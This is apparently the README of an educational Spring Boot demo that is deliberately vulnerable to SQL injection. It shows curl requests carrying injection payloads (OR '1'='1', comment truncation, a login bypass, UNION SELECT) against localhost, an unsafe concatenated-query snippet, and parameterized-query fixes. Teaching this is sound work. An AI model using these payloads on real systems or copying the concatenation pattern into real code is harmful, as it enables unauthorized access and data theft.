# SQL Injection Demo - Spring Boot

![Java CI with Maven](https://github.com/andrei-punko/sql-injection-demo/workflows/Java%20CI%20with%20Maven/badge.svg)

A demonstration Spring Boot project showing SQL injection vulnerability.

## ⚠️ WARNING

**This project is created for educational purposes only!**
**DO NOT USE this code in production!**

## Description

The project demonstrates a classic SQL injection vulnerability in a Spring Boot application. 
The application uses unsafe string concatenation when building SQL queries, 
which allows attackers to execute arbitrary SQL commands.

## Technologies

- Spring Boot 3.5.7
- Spring Data JPA
- H2 Database (in-memory)
- Java 21
- Lombok

## Running the Application

1. Make sure you have installed:
   - Java 21 or higher
   - Maven 3.6+

2. Run the application:
```bash
mvn spring-boot:run
```

Or use the provided batch script:
```bash
run.bat
```

3. The application will be available at: `http://localhost:8080`

## API Endpoints

### Vulnerable endpoints:

1. **Search user by username**
   ```
   GET /api/users/search?username={username}
   ```

2. **Search user by email**
   ```
   GET /api/users/by-email?email={email}
   ```

3. **Authentication (vulnerable)**
   ```
   POST /api/users/login
   Content-Type: application/json
   Body: {"username": "...", "password": "..."}
   ```

4. **Search users**
   ```
   GET /api/users/search-all?term={searchTerm}
   ```

### Safe endpoint (for comparison):

5. **Safe search**
   ```
   GET /api/users/safe/{username}
   ```

6. **Get all users**
   ```
   GET /api/users/all
   ```

## Normal Request Examples

### Example 1: Search user by username (normal request)

**Request:**
```bash
curl "http://localhost:8080/api/users/search?username=admin"
```

**Expected result:** Returns user with username "admin"

**Example response:**
```json
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "admin",
        "email": "admin@example.com",
        "password": "admin123",
        "role": "ADMIN"
      }
    ]
  },
  "query": "SELECT * FROM users WHERE username = 'admin'"
}
```

### Example 2: Search user by email (normal request)

**Request:**
```bash
curl "http://localhost:8080/api/users/by-email?email=user1@example.com"
```

### Example 3: Authentication (normal request)

**Request:**
```bash
curl -X POST http://localhost:8080/api/users/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"admin\", \"password\": \"admin123\"}"
```

**Expected result:** Successful authentication with correct credentials

### Example 4: Search users (normal request)

**Request:**
```bash
curl "http://localhost:8080/api/users/search-all?term=john"
```

**Expected result:** Returns users whose username or email contains "john"

### Example 5: Safe user search (protected from SQL injection)

**Request:**
```bash
curl "http://localhost:8080/api/users/safe/admin"
```

**Expected result:** Returns user using safe method (parameterized queries)

### Example 6: Get all users

**Request:**
```bash
curl "http://localhost:8080/api/users/all"
```

**Expected result:** Returns a list of all users in the database

## SQL Injection Examples

### Example 1: Authentication bypass

**Request:**
```bash
curl "http://localhost:8080/api/users/search?username=admin' OR '1'='1"
```

**Result:** Returns all users from the database

### Example 2: SQL commenting

**Request:**
```bash
curl "http://localhost:8080/api/users/search?username=admin'--"
```

**Result:** Returns admin user, ignoring other conditions

### Example 3: Authorization bypass

**Request:**
```bash
curl -X POST http://localhost:8080/api/users/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"
```

**Result:** Successful authentication without knowing the password

### Example 4: Extract all data

**Request:**
```bash
curl "http://localhost:8080/api/users/search-all?term=' OR '1'='1'--"
```

**Result:** Returns all users regardless of the search query

### Example 5: UNION attack

**Request:**
```bash
curl "http://localhost:8080/api/users/search?username=' UNION SELECT * FROM users--"
```

## Why is this vulnerable?

The `VulnerableUserRepository.java` file uses unsafe SQL construction methods:

```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
```

User input is directly inserted into SQL queries without validation and escaping.

## How to protect yourself?

1. **Use parameterized queries:**
   ```java
   @Query("SELECT u FROM User u WHERE u.username = :username")
   List<User> findByUsername(@Param("username") String username);
   ```

2. **Use Spring Data JPA methods:**
   ```java
   List<User> findByUsername(String username);
   ```

3. **Validate and sanitize user input**

4. **Use the principle of least privilege for the database**

5. **Apply prepared statements**

## H2 Console

To view the database, open:
- URL: `http://localhost:8080/h2-console`
- JDBC URL: `jdbc:h2:mem:testdb`
- Username: `sa`
- Password: (leave empty)

## License

This project is created for educational purposes only.
